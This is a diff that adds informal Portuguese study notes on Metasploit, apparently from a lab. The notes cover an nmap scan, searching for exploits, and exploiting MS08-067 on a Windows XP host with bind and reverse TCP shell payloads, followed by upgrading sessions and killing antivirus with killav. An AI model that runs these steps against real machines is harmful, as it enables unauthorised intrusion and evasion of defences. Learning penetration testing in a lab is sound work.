@@ -1,0 +1,62 @@
+msfconsole     no shell
+msfupdate -- atualização
+msfdb init ---- crea inicialização post
+verificar status --- service postgresql status  .. caso esteja dead
+usar o service postgresql start
+nmap -A -oX resultados.xml 192 268 13-16
+
+? --- ver os comandos
+pwd -- olha a onda esta localizado a pasta
+
+db_import resultados.xml
+hosts -- mostra o parametro das maquinas encontradas .. pelo import xml 
+
+services .... todos os serviços que descobrio no -A ... ele informa
+
+caso não use o nmap ..... db_nmap -A 192.168.1.1
+msfupdate --- atualizações ...
+
+pesquisar coisas especificas ... search -h
+search cve:2015 type:exploit app:client
+
+search Internet Explorer
+search ms15
+search fileformat
+search netapi -- serve
+
+agora para usar o que vc achou
+
+use exploit/windows/smb/ms08_067_netapi ... digite o cmainho todo que achou 
+
+show options --- o que precisa configurar para rodar
+set RHOST 192.168.1.16 xp
+setg Lhost 192.168.1.107
+
+search windows/shell
+set payload windows/shell/tcp_bind
+
+show missing -- pra ver se esquecir de algo
+agora que configurou tudo .. rode o comando "exploit"
+agora vc tá no cmd do windows
+pode usar reverse_tcp
+
+sessions -h ... comando pra ver as sessoes
+
+quando pegar a sessão .. deh o comando sessions -u 2
+
+sessions -s killav -i 2 .. matando anti virus
+
+para ver o scripts search post/windows
+
+comando para baixar kkkk coisas dowload calc.exe
+
+vc pode criar uma arquivo ac
+
+se tiver dentro do msf .. digitar msf > resource script.rc
+msfconsole -r script.rc
+
+windows/meterpreter/reverse_tcp
+
+show targets
+set target 
+
